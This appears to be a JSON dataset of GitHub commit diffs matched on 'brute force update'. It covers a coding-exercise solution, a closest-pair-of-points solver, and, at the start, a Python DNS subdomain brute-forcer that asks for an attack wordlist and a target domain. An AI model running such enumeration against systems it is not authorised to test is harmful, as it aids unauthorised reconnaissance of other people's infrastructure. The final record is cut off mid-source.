\u2593\u2588\u2588\u2584 \u2592\u2588\u2588\u2592 \u2584\u2588\u2588\u2593\u2588\u2588 \u2591\u2584\u2588 \u2592\u2593\u2588\u2588 \u2592\u2588\u2588\u2591\u2592 \u2593\u2588\u2588\u2591 \u2592\u2591\u2592\u2588\u2588\u2588 \u2591\u2593\u2588\u2584 \u258c\u2593\u2588\u2588\u2592 \u2590\u258c\u2588\u2588\u2592 \u2592 \u2588\u2588\u2592 \u2592\u2588\u2588\u2591\u2588\u2580 \u2592\u2588\u2588\u2580\u2580\u2588\u2584 \u2593\u2593\u2588 \u2591\u2588\u2588\u2591\u2591 \u2593\u2588\u2588\u2593 \u2591 \u2592\u2593\u2588 \u2584 \u2591\u2592\u2588\u2588\u2588\u2588\u2593 \u2592\u2588\u2588\u2591 \u2593\u2588\u2588\u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592 \u2591\u2593\u2588 \u2580\u2588\u2593\u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2593 \u2592\u2588\u2588\u2592 \u2591 \u2591\u2592\u2588\u2588\u2588\u2588\u2592 \u2592\u2592\u2593 \u2592 \u2591 \u2592\u2591 \u2592 \u2592 \u2592 \u2592\u2593\u2592 \u2592 \u2591 \u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592\u2591 \u2592\u2593 \u2591\u2592\u2593\u2591\u2591\u2592\u2593\u2592 \u2592 \u2592 \u2592 \u2591\u2591 \u2591\u2591 \u2592\u2591 \u2591 \u2591 \u2592 \u2592 \u2591 \u2591\u2591 \u2591 \u2592\u2591\u2591 \u2591\u2592 \u2591 \u2591 \u2592\u2591\u2592 \u2591 \u2591\u2592 \u2591 \u2592\u2591\u2591\u2591\u2592\u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591\u2591 \u2591 \u2591\u2591\u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 by Berg, 2022\"\"\")) res=dns.resolver.Resolver() caminho=input(fade.fire(\"Digite o caminho da wordlist desejada para o ataque: \")) arquivo=open(caminho) subdominios=arquivo.read().splitlines() alvo=input(fade.fire(\"Digite o alvo desejado[URL]: \")) for sub in subdominios: try: sub_alvo=sub +\".\" +alvo resultado=res.resolve(sub_alvo, \"A\") for ip in resultado: print(fade.fire(f\"{sub_alvo.strip():-<50}-> {ip}\")) except: pass ","sourceWithComments":"# requirements \n# pip install dnspython && pip install fade\n\nimport dns.resolver\nimport fade\n\nprint(fade.fire(\"\"\"\u2593\u2588\u2588\u2588\u2588\u2588\u2584  \u2588\u2588\u2588\u2584    \u2588   \u2588\u2588\u2588\u2588\u2588\u2588     \u2584\u2584\u2584\u2584    \u2588\u2588\u2580\u2588\u2588\u2588   \u2588    \u2588\u2588 \u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2593\u2593\u2588\u2588\u2588\u2588\u2588 \n\u2592\u2588\u2588\u2580 \u2588\u2588\u258c \u2588\u2588 \u2580\u2588   \u2588 \u2592\u2588\u2588    \u2592    \u2593\u2588\u2588\u2588\u2588\u2588\u2584 \u2593\u2588\u2588 \u2592 \u2588\u2588\u2592 \u2588\u2588  \u2593\u2588\u2588\u2592\u2593  \u2588\u2588\u2592 \u2593\u2592\u2593\u2588   \u2580 \n\u2591\u2588\u2588   \u2588\u258c\u2593\u2588\u2588  \u2580\u2588 \u2588\u2588\u2592\u2591 \u2593\u2588\u2588\u2584      \u2592\u2588\u2588\u2592 \u2584\u2588\u2588\u2593\u2588\u2588 \u2591\u2584\u2588 \u2592\u2593\u2588\u2588  \u2592\u2588\u2588\u2591\u2592 \u2593\u2588\u2588\u2591 \u2592\u2591\u2592\u2588\u2588\u2588   \n\u2591\u2593\u2588\u2584   \u258c\u2593\u2588\u2588\u2592  \u2590\u258c\u2588\u2588\u2592  \u2592   \u2588\u2588\u2592   \u2592\u2588\u2588\u2591\u2588\u2580  \u2592\u2588\u2588\u2580\u2580\u2588\u2584  \u2593\u2593\u2588  \u2591\u2588\u2588\u2591\u2591 \u2593\u2588\u2588\u2593 \u2591 \u2592\u2593\u2588  \u2584 \n\u2591\u2592\u2588\u2588\u2588\u2588\u2593 \u2592\u2588\u2588\u2591   \u2593\u2588\u2588\u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592   \u2591\u2593\u2588  \u2580\u2588\u2593\u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2593   \u2592\u2588\u2588\u2592 \u2591 \u2591\u2592\u2588\u2588\u2588\u2588\u2592\n \u2592\u2592\u2593  \u2592 \u2591 \u2592\u2591   \u2592 \u2592 \u2592 \u2592\u2593\u2592 \u2592 \u2591   \u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592\u2591 \u2592\u2593 \u2591\u2592\u2593\u2591\u2591\u2592\u2593\u2592 \u2592 \u2592   \u2592 \u2591\u2591   \u2591\u2591 \u2592\u2591 \u2591\n \u2591 \u2592  \u2592 \u2591 \u2591\u2591   \u2591 \u2592\u2591\u2591 \u2591\u2592  \u2591 \u2591   \u2592\u2591\u2592   \u2591   \u2591\u2592 \u2591 \u2592\u2591\u2591\u2591\u2592\u2591 \u2591 \u2591     \u2591     \u2591 \u2591  \u2591\n \u2591 \u2591  \u2591    \u2591   \u2591 \u2591 \u2591  \u2591  \u2591      \u2591    \u2591   \u2591\u2591   \u2591  \u2591\u2591\u2591 \u2591 \u2591   \u2591         \u2591   \n   \u2591             \u2591       \u2591      \u2591         \u2591        \u2591                 \u2591  \u2591\n \u2591                                   \u2591 by Berg, 2022\"\"\"))\n\nres = dns.resolver.Resolver()\ncaminho = input(fade.fire(\"Digite o caminho da wordlist desejada para o ataque: \"))\narquivo = open(caminho)\nsubdominios = arquivo.read().splitlines()\n\nalvo = input(fade.fire(\"Digite o alvo desejado [URL]: \"))\n\nfor sub in subdominios:\n\n    try:\n        \n        sub_alvo = sub + \".\" + alvo\n        resultado = res.resolve(sub_alvo, \"A\")\n\n        for ip in resultado:\n\n            print(fade.fire(f\"{sub_alvo.strip():-<50}->  {ip}\"))\n\n    except:\n        pass\n"}},"msg":"Update DNS_Brute_Force.py"}},"https:\/\/github.com\/SeanPresent\/codingtest_Python":{"c3db0912a1cdbbb0fede55f5d3790774e4df9825":{"url":"https:\/\/api.github.com\/repos\/SeanPresent\/codingtest_Python\/commits\/c3db0912a1cdbbb0fede55f5d3790774e4df9825","html_url":"https:\/\/github.com\/SeanPresent\/codingtest_Python\/commit\/c3db0912a1cdbbb0fede55f5d3790774e4df9825","sha":"c3db0912a1cdbbb0fede55f5d3790774e4df9825","keyword":"brute force update","diff":"diff --git a\/Codility\/[01_Brute-Force]CyclicRotation.py b\/Codility\/[01_Brute-Force]CyclicRotation.py\nindex b43b0d6..5892fe7 100644\n--- a\/Codility\/[01_Brute-Force]CyclicRotation.py\n+++ b\/Codility\/[01_Brute-Force]CyclicRotation.py\n@@ -55,7 +55,7 @@ def solution(A, K):\n     K %= len(A)  \n     if K == 0:\n         return A\n-    \n+    return A[-K:] + A[:-K]\n     \n     \n # run time error\n@@ -71,10 +71,3 @@ def solution(A, K):\n \n print(solution(A, K))\n     \n-    \n-    \n-    \n-    \n-    \n-    \n-    return A[-K:] + A[:-K]\n","message":"","files":{"\/Codility\/[01_Brute-Force]CyclicRotation.py":{"changes":[{"diff":"\n \n print(solution(A, K))\n     \n-    \n-    \n-    \n-    \n-    \n-    \n-    return A[-K:] + A[:-K]\n","add":0,"remove":7,"filename":"\/Codility\/[01_Brute-Force]CyclicRotation.py","badparts":["    return A[-K:] + A[:-K]"],"goodparts":[]}],"source":"\n \"\"\" An array A consisting of N integers is given. Rotation of the array means that each element is shifted right by one index, and the last element of the array is moved to the first place. For example, the rotation of array A=[3, 8, 9, 7, 6] is[6, 3, 8, 9, 7](elements are shifted right by one index and 6 is moved to the first place). The goal is to rotate array A K times; that is, each element of A will be shifted to the right K times. Write a function: def solution(A, K) that, given an array A consisting of N integers and an integer K, returns the array A rotated K times. For example, given A=[3, 8, 9, 7, 6] K=3 the function should return[9, 7, 6, 3, 8]. Three rotations were made: [3, 8, 9, 7, 6] ->[6, 3, 8, 9, 7] [6, 3, 8, 9, 7] ->[7, 6, 3, 8, 9] [7, 6, 3, 8, 9] ->[9, 7, 6, 3, 8] For another example, given A=[0, 0, 0] K=1 the function should return[0, 0, 0] Given A=[1, 2, 3, 4] K=4 the function should return[1, 2, 3, 4] Assume that: N and K are integers within the range[0..100]; each element of array A is an integer within the range[\u22121,000..1,000]. In your solution, focus on correctness. The performance of your solution will not be the focus of the assessment. ** Copyright 2009\u20132023 by Codility Limited. All Rights Reserved. Unauthorized copying, publication or disclosure prohibited. \"\"\" def solution(A, K): if not A: return A K %=len(A) if K==0: return A A=[1, 2, 3, 4, 5] K=3 def solution(A, K): answer=[] for i in range(len(A)): count=i -K answer.append(A[count]) return answer print(solution(A, K)) return A[-K:] +A[:-K] ","sourceWithComments":"\n\n\"\"\"\nAn array A consisting of N integers is given. Rotation of the array means that each element is shifted right by one index, and the last element of the array is moved to the first place. For example, the rotation of array A = [3, 8, 9, 7, 6] is [6, 3, 8, 9, 7] (elements are shifted right by one index and 6 is moved to the first place).\n\nThe goal is to rotate array A K times; that is, each element of A will be shifted to the right K times.\n\nWrite a function:\n\ndef solution(A, K)\n\nthat, given an array A consisting of N integers and an integer K, returns the array A rotated K times.\n\nFor example, given\n\n    A = [3, 8, 9, 7, 6]\n    K = 3\nthe function should return [9, 7, 6, 3, 8]. Three rotations were made:\n\n    [3, 8, 9, 7, 6] -> [6, 3, 8, 9, 7]\n    [6, 3, 8, 9, 7] -> [7, 6, 3, 8, 9]\n    [7, 6, 3, 8, 9] -> [9, 7, 6, 3, 8]\nFor another example, given\n\n    A = [0, 0, 0]\n    K = 1\nthe function should return [0, 0, 0]\n\nGiven\n\n    A = [1, 2, 3, 4]\n    K = 4\nthe function should return [1, 2, 3, 4]\n\nAssume that:\n\nN and K are integers within the range [0..100];\neach element of array A is an integer within the range [\u22121,000..1,000].\nIn your solution, focus on correctness. The performance of your solution will not be the focus of the assessment.\n\n**\nCopyright 2009\u20132023 by Codility Limited. All Rights Reserved. Unauthorized copying, publication or disclosure prohibited.\n\n\"\"\"\n\n\n\n# you can write to stdout for debugging purposes, e.g.\n# print(\"this is a debug message\")\n\ndef solution(A, K):\n    if not A:\n        return A\n    \n    K %= len(A)  \n    if K == 0:\n        return A\n    \n    \n    \n# run time error\nA = [1, 2, 3, 4, 5]\nK = 3\n\ndef solution(A, K):\n    answer = []\n    for i in range(len(A)):\n        count = i - K\n        answer.append(A[count])\n    return answer\n\nprint(solution(A, K))\n    \n    \n    \n    \n    \n    \n    \n    return A[-K:] + A[:-K]\n"}},"msg":"Update [01_Brute-Force]CyclicRotation.py"},"4c1eb4748d237a6f3464c50a30629fd6a9756049":{"url":"https:\/\/api.github.com\/repos\/SeanPresent\/codingtest_Python\/commits\/4c1eb4748d237a6f3464c50a30629fd6a9756049","html_url":"https:\/\/github.com\/SeanPresent\/codingtest_Python\/commit\/4c1eb4748d237a6f3464c50a30629fd6a9756049","message":"Update [01_Brute-Force]CyclicRotation.py","sha":"4c1eb4748d237a6f3464c50a30629fd6a9756049","keyword":"brute force update","diff":"diff --git a\/Codility\/[01_Brute-Force]CyclicRotation.py b\/Codility\/[01_Brute-Force]CyclicRotation.py\nindex 5892fe7..9ad625b 100644\n--- a\/Codility\/[01_Brute-Force]CyclicRotation.py\n+++ b\/Codility\/[01_Brute-Force]CyclicRotation.py\n@@ -49,13 +49,16 @@ def solution(A, K)\n # print(\"this is a debug message\")\n \n def solution(A, K):\n-    if not A:\n-        return A\n+    if not A: \n+        return A # \uc544\ubb34\uac83\ub3c4 \uc5c6\uc744 \ub54c [] \uc774\ub807\uac8c \ub098\uc628\ub2e4.\n+    \n+    K%=len(A) # \uc21c\uc11c\uac00 \ubc14\uaef4\ub3c4 \uc0c1\uad00\uc5c6\ub2e4.\n     \n-    K %= len(A)  \n-    if K == 0:\n+    if K == 0: # \uacc4\uc0b0\ud560 \ud544\uc694\uc5c6\uac8c \ub9cc\ub4e4\uae30,\n         return A\n+    \n     return A[-K:] + A[:-K]\n+\n     \n     \n # run time error\n","files":{"\/Codility\/[01_Brute-Force]CyclicRotation.py":{"changes":[{"diff":"\n # print(\"this is a debug message\")\n \n def solution(A, K):\n-    if not A:\n-        return A\n+    if not A: \n+        return A # \uc544\ubb34\uac83\ub3c4 \uc5c6\uc744 \ub54c [] \uc774\ub807\uac8c \ub098\uc628\ub2e4.\n+    \n+    K%=len(A) # \uc21c\uc11c\uac00 \ubc14\uaef4\ub3c4 \uc0c1\uad00\uc5c6\ub2e4.\n     \n-    K %= len(A)  \n-    if K == 0:\n+    if K == 0: # \uacc4\uc0b0\ud560 \ud544\uc694\uc5c6\uac8c \ub9cc\ub4e4\uae30,\n         return A\n+    \n     return A[-K:] + A[:-K]\n+\n     \n     \n # run time error\n","add":7,"remove":4,"filename":"\/Codility\/[01_Brute-Force]CyclicRotation.py","badparts":["    if not A:","        return A","    K %= len(A)  ","    if K == 0:"],"goodparts":["    if not A: ","        return A # \uc544\ubb34\uac83\ub3c4 \uc5c6\uc744 \ub54c [] \uc774\ub807\uac8c \ub098\uc628\ub2e4.","    K%=len(A) # \uc21c\uc11c\uac00 \ubc14\uaef4\ub3c4 \uc0c1\uad00\uc5c6\ub2e4.","    if K == 0: # \uacc4\uc0b0\ud560 \ud544\uc694\uc5c6\uac8c \ub9cc\ub4e4\uae30,"]}],"source":"\n \"\"\" An array A consisting of N integers is given. Rotation of the array means that each element is shifted right by one index, and the last element of the array is moved to the first place. For example, the rotation of array A=[3, 8, 9, 7, 6] is[6, 3, 8, 9, 7](elements are shifted right by one index and 6 is moved to the first place). The goal is to rotate array A K times; that is, each element of A will be shifted to the right K times. Write a function: def solution(A, K) that, given an array A consisting of N integers and an integer K, returns the array A rotated K times. For example, given A=[3, 8, 9, 7, 6] K=3 the function should return[9, 7, 6, 3, 8]. Three rotations were made: [3, 8, 9, 7, 6] ->[6, 3, 8, 9, 7] [6, 3, 8, 9, 7] ->[7, 6, 3, 8, 9] [7, 6, 3, 8, 9] ->[9, 7, 6, 3, 8] For another example, given A=[0, 0, 0] K=1 the function should return[0, 0, 0] Given A=[1, 2, 3, 4] K=4 the function should return[1, 2, 3, 4] Assume that: N and K are integers within the range[0..100]; each element of array A is an integer within the range[\u22121,000..1,000]. In your solution, focus on correctness. The performance of your solution will not be the focus of the assessment. ** Copyright 2009\u20132023 by Codility Limited. All Rights Reserved. Unauthorized copying, publication or disclosure prohibited. \"\"\" def solution(A, K): if not A: return A K %=len(A) if K==0: return A return A[-K:] +A[:-K] A=[1, 2, 3, 4, 5] K=3 def solution(A, K): answer=[] for i in range(len(A)): count=i -K answer.append(A[count]) return answer print(solution(A, K)) ","sourceWithComments":"\n\n\"\"\"\nAn array A consisting of N integers is given. Rotation of the array means that each element is shifted right by one index, and the last element of the array is moved to the first place. For example, the rotation of array A = [3, 8, 9, 7, 6] is [6, 3, 8, 9, 7] (elements are shifted right by one index and 6 is moved to the first place).\n\nThe goal is to rotate array A K times; that is, each element of A will be shifted to the right K times.\n\nWrite a function:\n\ndef solution(A, K)\n\nthat, given an array A consisting of N integers and an integer K, returns the array A rotated K times.\n\nFor example, given\n\n    A = [3, 8, 9, 7, 6]\n    K = 3\nthe function should return [9, 7, 6, 3, 8]. Three rotations were made:\n\n    [3, 8, 9, 7, 6] -> [6, 3, 8, 9, 7]\n    [6, 3, 8, 9, 7] -> [7, 6, 3, 8, 9]\n    [7, 6, 3, 8, 9] -> [9, 7, 6, 3, 8]\nFor another example, given\n\n    A = [0, 0, 0]\n    K = 1\nthe function should return [0, 0, 0]\n\nGiven\n\n    A = [1, 2, 3, 4]\n    K = 4\nthe function should return [1, 2, 3, 4]\n\nAssume that:\n\nN and K are integers within the range [0..100];\neach element of array A is an integer within the range [\u22121,000..1,000].\nIn your solution, focus on correctness. The performance of your solution will not be the focus of the assessment.\n\n**\nCopyright 2009\u20132023 by Codility Limited. All Rights Reserved. Unauthorized copying, publication or disclosure prohibited.\n\n\"\"\"\n\n\n\n# you can write to stdout for debugging purposes, e.g.\n# print(\"this is a debug message\")\n\ndef solution(A, K):\n    if not A:\n        return A\n    \n    K %= len(A)  \n    if K == 0:\n        return A\n    return A[-K:] + A[:-K]\n    \n    \n# run time error\nA = [1, 2, 3, 4, 5]\nK = 3\n\ndef solution(A, K):\n    answer = []\n    for i in range(len(A)):\n        count = i - K\n        answer.append(A[count])\n    return answer\n\nprint(solution(A, K))\n    \n"}},"msg":"Update [01_Brute-Force]CyclicRotation.py"}},"https:\/\/github.com\/yansans\/Tucil2_13521110_13521120":{"829c07c3ce821da1702aafb535ef007ae9d7c37c":{"url":"https:\/\/api.github.com\/repos\/yansans\/Tucil2_13521110_13521120\/commits\/829c07c3ce821da1702aafb535ef007ae9d7c37c","html_url":"https:\/\/github.com\/yansans\/Tucil2_13521110_13521120\/commit\/829c07c3ce821da1702aafb535ef007ae9d7c37c","message":"Update solve, add brute force","sha":"829c07c3ce821da1702aafb535ef007ae9d7c37c","keyword":"brute force update","diff":"diff --git a\/src\/solve.py b\/src\/solve.py\nindex 7d9027f..bf4f44c 100644\n--- a\/src\/solve.py\n+++ b\/src\/solve.py\n@@ -1,53 +1,110 @@\n from point import *\n \n-def printListCoord(points: list):\n-    for i in range(len(points)):\n-        points[i].print_point()\n+# def printListCoord(points: list):\n+#     for i in range(len(points)):\n+#         points[i].print_point()\n \n-def three_points(points: list) -> tuple:\n-    # return closest distance between three points\n-    p = [points[0], points[1]]\n-    d = distance(points[0], points[1])\n-    for i in range(3):\n-        for j in range(i + 1, 3):\n-            if distance(points[i], points[j]) < d:\n-                d = distance(points[i], points[j])\n-                p = [points[i], points[j]]\n-    return (d, p)\n+# def three_points(points: list) -> tuple:\n+#     # return closest distance between three points\n+#     p = [points[0], points[1]]\n+#     d = distance(points[0], points[1])\n+#     for i in range(3):\n+#         for j in range(i + 1, 3):\n+#             if distance(points[i], points[j]) < d:\n+#                 d = distance(points[i], points[j])\n+#                 p = [points[i], points[j]]\n+#     return (d, p)\n \n \n-def solve_2d(points: list, n: int) -> tuple:\n+# def solve_2d(points: list, n: int) -> tuple:\n \n-    p = []\n+#     p = []\n \n-    if n == 2:\n-        p = points\n-        return (distance(points[0], points[1]), p)\n-    elif n == 3:\n-        return three_points(points)\n+#     if n == 2:\n+#         p = points\n+#         return (distance(points[0], points[1]), p)\n+#     elif n == 3:\n+#         return three_points(points)\n     \n-    mid = n \/\/ 2\n-    mid_point = points[mid]\n-    dl, pl = solve_2d(points[:mid], mid)\n-    dr, pr = solve_2d(points[mid:], n - mid)\n+#     mid = n \/\/ 2\n+#     mid_point = points[mid]\n+#     dl, pl = solve_2d(points[:mid], mid)\n+#     dr, pr = solve_2d(points[mid:], n - mid)\n \n-    d, p = (dl, pl) if dl < dr else (dr, pr)\n+#     d, p = (dl, pl) if dl < dr else (dr, pr)\n     \n-    strip = []\n+#     strip = []\n+#     for i in range(n):\n+#         if abs(get_n_coord(points[i], 0) - get_n_coord(mid_point, 0)) < d:\n+#             strip.append(points[i])\n+\n+#     # strip.sort(key = lambda point: get_n_coord(point, 1))\n+#     for i in range(len(strip)):\n+#         for j in range(i + 1, len(strip)):\n+#             if get_n_coord(strip[j], 1) - get_n_coord(strip[i], 1) < d:\n+#                 nd = distance(strip[i], strip[j])\n+#                 if nd < d: \n+#                     d = nd\n+#                     p = [strip[i], strip[j]]\n+\n+#     return (d, p)\n+\n+def distance(p1, p2):\n+    return math.sqrt((p1.x - p2.x)**2 + (p1.y - p2.y)**2 + (p1.z - p2.z)**2)\n+\n+def solve_bruteForce(points):\n+    n = len(points)\n+    min = math.inf\n     for i in range(n):\n-        if abs(get_n_coord(points[i], 0) - get_n_coord(mid_point, 0)) < d:\n-            strip.append(points[i])\n+        for j in range(i+1, n):\n+            d = distance(points[i], points[j])\n+            if d < min:\n+                min = d\n+                result = (points[i], points[j])\n+    return result, min\n \n-    # strip.sort(key = lambda point: get_n_coord(point, 1))\n-    for i in range(len(strip)):\n-        for j in range(i + 1, len(strip)):\n-            if get_n_coord(strip[j], 1) - get_n_coord(strip[i], 1) < d:\n-                nd = distance(strip[i], strip[j])\n-                if nd < d: \n-                    d = nd\n-                    p = [strip[i], strip[j]]\n+# return (pair, distance)\n+def solve(points) -> tuple:\n+    n = len(points)\n+\n+    if n < 2:\n+        return None, math.inf\n+    if n == 2:\n+        return points, distance(points[0], points[1])\n+\n+    # Sort points berdasarkan x\n+    points.sort(key=lambda p: p.x)\n \n-    return (d, p)\n+    # Bagi menjadi dua bagian\n+    mid = n \/\/ 2\n+    left = points[:mid]\n+    right = points[mid:]\n \n+    # Cari pasangan terdekat di setiap bagian\n+    leftRes, leftDistance = solve(left)\n+    rightRes, rightDistance = solve(right)\n \n+    if rightDistance <= leftDistance:\n+      res = rightRes\n+      resDist = rightDistance\n+    else:\n+      res = leftRes\n+      resDist = leftDistance\n+\n+    # Cari pasangan terdekat yang berada di strip\n+    strip = []\n+    for i in range(n):\n+      if abs(points[i].x - points[mid].x) < resDist:\n+        strip.append(points[i])\n+\n+    strip.sort(key=lambda p: p.y)\n     \n+    for i in range (len(strip)):\n+        for j in range(i + 1, len(strip)):\n+            if strip[j].y - strip[i].y >= resDist:\n+                break\n+            if distance(strip[i], strip[j]) < resDist:\n+                res = (strip[i], strip[j])\n+                resDist = distance(strip[i], strip[j])\n+\n+    return res, resDist\n\\ No newline at end of file\n","files":{"\/src\/solve.py":{"changes":[{"diff":"\n from point import *\n \n-def printListCoord(points: list):\n-    for i in range(len(points)):\n-        points[i].print_point()\n+# def printListCoord(points: list):\n+#     for i in range(len(points)):\n+#         points[i].print_point()\n \n-def three_points(points: list) -> tuple:\n-    # return closest distance between three points\n-    p = [points[0], points[1]]\n-    d = distance(points[0], points[1])\n-    for i in range(3):\n-        for j in range(i + 1, 3):\n-            if distance(points[i], points[j]) < d:\n-                d = distance(points[i], points[j])\n-                p = [points[i], points[j]]\n-    return (d, p)\n+# def three_points(points: list) -> tuple:\n+#     # return closest distance between three points\n+#     p = [points[0], points[1]]\n+#     d = distance(points[0], points[1])\n+#     for i in range(3):\n+#         for j in range(i + 1, 3):\n+#             if distance(points[i], points[j]) < d:\n+#                 d = distance(points[i], points[j])\n+#                 p = [points[i], points[j]]\n+#     return (d, p)\n \n \n-def solve_2d(points: list, n: int) -> tuple:\n+# def solve_2d(points: list, n: int) -> tuple:\n \n-    p = []\n+#     p = []\n \n-    if n == 2:\n-        p = points\n-        return (distance(points[0], points[1]), p)\n-    elif n == 3:\n-        return three_points(points)\n+#     if n == 2:\n+#         p = points\n+#         return (distance(points[0], points[1]), p)\n+#     elif n == 3:\n+#         return three_points(points)\n     \n-    mid = n \/\/ 2\n-    mid_point = points[mid]\n-    dl, pl = solve_2d(points[:mid], mid)\n-    dr, pr = solve_2d(points[mid:], n - mid)\n+#     mid = n \/\/ 2\n+#     mid_point = points[mid]\n+#     dl, pl = solve_2d(points[:mid], mid)\n+#     dr, pr = solve_2d(points[mid:], n - mid)\n \n-    d, p = (dl, pl) if dl < dr else (dr, pr)\n+#     d, p = (dl, pl) if dl < dr else (dr, pr)\n     \n-    strip = []\n+#     strip = []\n+#     for i in range(n):\n+#         if abs(get_n_coord(points[i], 0) - get_n_coord(mid_point, 0)) < d:\n+#             strip.append(points[i])\n+\n+#     # strip.sort(key = lambda point: get_n_coord(point, 1))\n+#     for i in range(len(strip)):\n+#         for j in range(i + 1, len(strip)):\n+#             if get_n_coord(strip[j], 1) - get_n_coord(strip[i], 1) < d:\n+#                 nd = distance(strip[i], strip[j])\n+#                 if nd < d: \n+#                     d = nd\n+#                     p = [strip[i], strip[j]]\n+\n+#     return (d, p)\n+\n+def distance(p1, p2):\n+    return math.sqrt((p1.x - p2.x)**2 + (p1.y - p2.y)**2 + (p1.z - p2.z)**2)\n+\n+def solve_bruteForce(points):\n+    n = len(points)\n+    min = math.inf\n     for i in range(n):\n-        if abs(get_n_coord(points[i], 0) - get_n_coord(mid_point, 0)) < d:\n-            strip.append(points[i])\n+        for j in range(i+1, n):\n+            d = distance(points[i], points[j])\n+            if d < min:\n+                min = d\n+                result = (points[i], points[j])\n+    return result, min\n \n-    # strip.sort(key = lambda point: get_n_coord(point, 1))\n-    for i in range(len(strip)):\n-        for j in range(i + 1, len(strip)):\n-            if get_n_coord(strip[j], 1) - get_n_coord(strip[i], 1) < d:\n-                nd = distance(strip[i], strip[j])\n-                if nd < d: \n-                    d = nd\n-                    p = [strip[i], strip[j]]\n+# return (pair, distance)\n+def solve(points) -> tuple:\n+    n = len(points)\n+\n+    if n < 2:\n+        return None, math.inf\n+    if n == 2:\n+        return points, distance(points[0], points[1])\n+\n+    # Sort points berdasarkan x\n+    points.sort(key=lambda p: p.x)\n \n-    return (d, p)\n+    # Bagi menjadi dua bagian\n+    mid = n \/\/ 2\n+    left = points[:mid]\n+    right = points[mid:]\n \n+    # Cari pasangan terdekat di setiap bagian\n+    leftRes, leftDistance = solve(left)\n+    rightRes, rightDistance = solve(right)\n \n+    if rightDistance <= leftDistance:\n+      res = rightRes\n+      resDist = rightDistance\n+    else:\n+      res = leftRes\n+      resDist = leftDistance\n+\n+    # Cari pasangan terdekat yang berada di strip\n+    strip = []\n+    for i in range(n):\n+      if abs(points[i].x - points[mid].x) < resDist:\n+        strip.append(points[i])\n+\n+    strip.sort(key=lambda p: p.y)\n     \n+    for i in range (len(strip)):\n+        for j in range(i + 1, len(strip)):\n+            if strip[j].y - strip[i].y >= resDist:\n+                break\n+            if distance(strip[i], strip[j]) < resDist:\n+                res = (strip[i], strip[j])\n+                resDist = distance(strip[i], strip[j])\n+\n+    return res, resDist\n\\ No newline at end of file\n","add":94,"remove":37,"filename":"\/src\/solve.py","badparts":["def printListCoord(points: list):","    for i in range(len(points)):","        points[i].print_point()","def three_points(points: list) -> tuple:","    p = [points[0], points[1]]","    d = distance(points[0], points[1])","    for i in range(3):","        for j in range(i + 1, 3):","            if distance(points[i], points[j]) < d:","                d = distance(points[i], points[j])","                p = [points[i], points[j]]","    return (d, p)","def solve_2d(points: list, n: int) -> tuple:","    p = []","    if n == 2:","        p = points","        return (distance(points[0], points[1]), p)","    elif n == 3:","        return three_points(points)","    mid = n \/\/ 2","    mid_point = points[mid]","    dl, pl = solve_2d(points[:mid], mid)","    dr, pr = solve_2d(points[mid:], n - mid)","    d, p = (dl, pl) if dl < dr else (dr, pr)","    strip = []","        if abs(get_n_coord(points[i], 0) - get_n_coord(mid_point, 0)) < d:","            strip.append(points[i])","    for i in range(len(strip)):","        for j in range(i + 1, len(strip)):","            if get_n_coord(strip[j], 1) - get_n_coord(strip[i], 1) < d:","                nd = distance(strip[i], strip[j])","                if nd < d: ","                    d = nd","                    p = [strip[i], strip[j]]","    return (d, p)"],"goodparts":["def distance(p1, p2):","    return math.sqrt((p1.x - p2.x)**2 + (p1.y - p2.y)**2 + (p1.z - p2.z)**2)","def solve_bruteForce(points):","    n = len(points)","    min = math.inf","        for j in range(i+1, n):","            d = distance(points[i], points[j])","            if d < min:","                min = d","                result = (points[i], points[j])","    return result, min","def solve(points) -> tuple:","    n = len(points)","    if n < 2:","        return None, math.inf","    if n == 2:","        return points, distance(points[0], points[1])","    points.sort(key=lambda p: p.x)","    mid = n \/\/ 2","    left = points[:mid]","    right = points[mid:]","    leftRes, leftDistance = solve(left)","    rightRes, rightDistance = solve(right)","    if rightDistance <= leftDistance:","      res = rightRes","      resDist = rightDistance","    else:","      res = leftRes","      resDist = leftDistance","    strip = []","    for i in range(n):","      if abs(points[i].x - points[mid].x) < resDist:","        strip.append(points[i])","    strip.sort(key=lambda p: p.y)","    for i in range (len(strip)):","        for j in range(i + 1, len(strip)):","            if strip[j].y - strip[i].y >= resDist:","                break","            if distance(strip[i], strip[j]) < resDist:","                res = (strip[i], strip[j])","                resDist = distance(strip[i], strip[j])","    return res, resDist"]}],"source":"\nfrom point import * def printListCoord(points: list): for i in range(len(points)): points[i].print_point() def three_points(points: list) -> tuple: p=[points[0], points[1]] d=distance(points[0], points[1]) for i in range(3): for j in range(i +1, 3): if distance(points[i], points[j]) < d: d=distance(points[i], points[j]) p=[points[i], points[j]] return(d, p) def solve_2d(points: list, n: int) -> tuple: p=[] if n==2: p=points return(distance(points[0], points[1]), p) elif n==3: return three_points(points) mid=n \/\/ 2 mid_point=points[mid] dl, pl=solve_2d(points[:mid], mid) dr, pr=solve_2d(points[mid:], n -mid) d, p=(dl, pl) if dl < dr else(dr, pr) strip=[] for i in range(n): if abs(get_n_coord(points[i], 0) -get_n_coord(mid_point, 0)) < d: strip.append(points[i]) for i in range(len(strip)): for j in range(i +1, len(strip)): if get_n_coord(strip[j], 1) -get_n_coord(strip[i], 1) < d: nd=distance(strip[i], strip[j]) if nd < d: d=nd p=[strip[i], strip[j]] return(d, p) ","sourceWithComments":"from point import *\n\ndef printListCoord(points: list):\n    for i in range(len(points)):\n        points[i].print_point()\n\ndef three_points(points: list) -> tuple:\n    # return closest distance between three points\n    p = [points[0], points[1]]\n    d = distance(points[0], points[1])\n    for i in range(3):\n        for j in range(i + 1, 3):\n            if distance(points[i], points[j]) < d:\n                d = distance(points[i], points[j])\n                p = [points[i], points[j]]\n    return (d, p)\n\n\ndef solve_2d(points: list, n: int) -> 